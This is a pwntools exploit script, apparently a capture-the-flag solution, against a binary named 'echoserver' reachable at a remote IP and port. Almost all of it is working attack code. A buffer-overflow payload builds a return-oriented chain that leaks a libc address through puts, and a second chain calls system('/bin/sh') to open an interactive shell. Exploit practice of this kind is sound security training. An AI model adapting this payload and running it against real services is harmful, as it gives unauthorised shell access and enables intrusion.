#!/usr/bin/python3
from pwn import *

def start(argv=[], *a, **kw):
  if args.GDB:  # GDB NOASLR
    context.terminal = ["/mnt/c/wsl_terminal/wsl-terminal/open-wsl.exe", "-e"]
    return gdb.debug([exe] + argv, gdbscript=gdbscript, env={"LD_PRELOAD": libc.path},*a, **kw)
  elif args.REMOTE:
    return remote('125.235.240.166', 20101, *a, **kw)
  else:
    return process(['ld-2.31.so', '--preload', './libc6_2.31-0ubuntu9_amd64.so', exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *0x401260
c
'''.format(**locals())


exe = './echoserver'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./libc6_2.31-0ubuntu9_amd64.so')
# warning/info/debug
context.log_level = 'info'

ret = 0x401016
pop_rdi = 0x4012cb
main = 0x4011AE

io = start()

payload = b'QUIT'
payload += b'A'* (136 - 4)
payload += p64(pop_rdi)
payload += p64(elf.got.gets)
payload += p64(elf.plt.puts)
payload += p64(ret)
payload += p64(main)

io.sendline(payload)
io.recvuntil(b'\xcb\x12\x40')
leak = u64(io.recv(8)[1:-1].ljust(8, b"\x00"))
libc_address = leak - 0x086af0

payload = b'QUIT'
payload += b'A'* (136 - 4)
payload += p64(pop_rdi)
# bin/sh
payload += p64(libc_address + 0x1b75aa)
# system
payload += p64(libc_address + 0x055410)
io.sendline(payload)

io.interactive()